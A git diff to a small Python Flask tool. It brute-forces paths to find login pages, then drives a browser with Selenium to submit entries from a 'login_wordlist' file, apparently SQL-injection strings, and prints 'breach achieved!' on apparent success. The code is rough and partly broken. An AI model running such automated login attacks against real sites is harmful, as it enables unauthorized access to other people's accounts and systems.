@@ -1,12 +1,15 @@
 import asyncio
 import aiohttp
+import selenium
 from fake_useragent import UserAgent
 from flask import Flask, request, render_template
 from selenium import webdriver
 from selenium.webdriver.common.by import By
+from selenium.webdriver.support import expected_conditions as ec
+from selenium.webdriver.support.wait import WebDriverWait
 
 ua = UserAgent()
-driver = webdriver.Edge()
+app = Flask(__name__, template_folder='templates')
 
 
 class ColorPalette:
@@ -25,8 +28,62 @@ def read_wordlist():
     return splitted_wordlist
 
 
-word_list = read_wordlist()
+def read_sqllist():
+    with open("login_wordlist.txt") as text_file:
+        sqllist = text_file.read()
+        splitted_sqllist = sqllist.strip().split("\n")
+    return splitted_sqllist
 
+
+def login_check(fu):
+    # go to log in webpage
+    driver = webdriver.Edge()
+    driver.get(fu)
+
+
+    try:
+        username = driver.find_element(By.ID, "username")
+        password = driver.find_element(By.ID, "password")
+        button = driver.find_element(By.XPATH, "button")
+    except selenium.common.exceptions.NoSuchElementException:
+        try:
+            username = driver.find_element(By.ID, "email")
+            password = driver.find_element(By.ID, "password")
+            button = driver.find_element(By.XPATH, "button")
+        except selenium.common.exceptions.NoSuchElementException:
+            try:
+                username = driver.find_element(By.ID, "username")
+                password = driver.find_element(By.ID, "password")
+                button = driver.find_element(By.XPATH, "submit")
+            except selenium.common.exceptions.NoSuchElementException:
+                try:
+                    username = driver.find_element(By.ID, "email")
+                    password = driver.find_element(By.ID, "password")
+                    button = driver.find_element(By.XPATH, "submit")
+                except selenium.common.exceptions.NoSuchElementException:
+                    return
+
+    # retrieve list of passwords (the last password is my real password
+    sqllist = read_sqllist()
+    y = ""
+    # loop through password options
+    for x in sqllist:
+        username.send_keys(x)
+        password.send_keys("password")
+        driver.execute_script("arguments[0].click();", button)
+        if ec.presence_of_element_located((By.ID, "username")):
+            username.clear()
+            password.clear()
+        else:
+            print("breach achieved!")
+            break
+
+
+    # tell driver to wait until webpage gives an alert (it never will), this is so progress can be observed
+    WebDriverWait(driver, 200).until(ec.alert_is_present(), "done")
+
+
+word_list = read_wordlist()
 founded_url = []
 
 
@@ -34,8 +91,7 @@ async def search_login(session, url, word):
     try:
         async with session.get(url + word, allow_redirects=False, verify_ssl=False) as response:
             status_code = response.status
-            driver.get(url)
-            if status_code == 200 and driver.find_element(By.ID, "username") is not None:
+            if status_code == 200:
                 print(f"{url}{word} {ColorPalette.M} --> {ColorPalette.G} Boom! {ColorPalette.W}")
                 founded_url.append(url + word)
             elif status_code == 403:
@@ -52,8 +108,7 @@ async def search_login(session, url, word):
     except aiohttp.ClientConnectorError:
         pass
 
-
-app = Flask(__name__)
+    return founded_url
 
 
 @app.route("/", methods=["POST", "GET"])
@@ -86,13 +141,10 @@ async def home():
 
         if founded_url:
             for fu in founded_url:
-                print(fu)
+                login_check(fu)
 
     return render_template("index.html")
 
 
 if __name__ == "__main__":
-    app.run()
-
-
-#TODO: fix edge webdriver issue and retry the if condition
+    app.run(port=8000)
